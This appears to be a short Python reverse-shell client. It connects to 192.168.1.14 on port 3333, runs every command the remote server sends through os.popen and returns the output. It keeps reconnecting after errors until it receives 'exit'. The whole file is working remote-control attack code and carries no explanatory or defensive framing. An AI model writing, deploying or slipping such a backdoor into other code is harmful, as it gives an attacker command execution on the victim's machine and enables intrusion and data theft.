from socket import *
import os
import time

running = True
while running:
    try:
        client = socket(AF_INET, SOCK_STREAM)
        client.connect(("192.168.1.14", 3333))

        while True:
            data = client.recv(2048).decode()
            print(f"Received: {data}")

            if data == "exit":
                client.close()
                print("Connection terminated by Server")
                running = False
                break

            result = os.popen(data).read()
            client.sendall(result.encode())
    except:
        if not running:
            break
        print("Error, Please wait...")
        time.sleep(5)
        print("Try again..")
        continue